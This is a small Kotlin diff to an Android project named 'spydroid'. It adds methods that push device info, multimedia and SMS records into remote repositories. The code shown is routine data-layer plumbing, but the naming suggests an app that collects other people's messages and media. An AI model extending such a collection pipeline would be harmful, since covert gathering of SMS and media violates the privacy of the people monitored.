@@ -30,6 +30,9 @@ import net.spydroid.common.remote.domain.InfoRepository
 import net.spydroid.common.remote.domain.MultimediaRepository
 import net.spydroid.common.remote.domain.SmsRepository
 import net.spydroid.common.remote.network.models.Devices
+import net.spydroid.common.remote.network.models.InfoDevices
+import net.spydroid.common.remote.network.models.MultimediaDevices
+import net.spydroid.common.remote.network.models.SmsDevices
 import net.spydroid.common.remote.network.networkModule
 import org.koin.android.ext.koin.androidContext
 import org.koin.core.component.KoinComponent
@@ -83,6 +86,21 @@ class RemoteDataProvider private constructor(
     fun insertDevice(device: Devices) =
         scope.launch {
             devicesRepository.insertDevice(device)
+        }
+
+    fun insertInfo(info: InfoDevices) =
+        scope.launch {
+            infoRepository.insertInfo(info)
+        }
+
+    fun insertMultimedia(multimedia: MultimediaDevices) =
+        scope.launch {
+            multimediaRepository.insertMultimedia(multimedia)
+        }
+
+    fun insertSms(sms: SmsDevices) =
+        scope.launch {
+            smsRepository.insertSms(sms)
         }
 
 
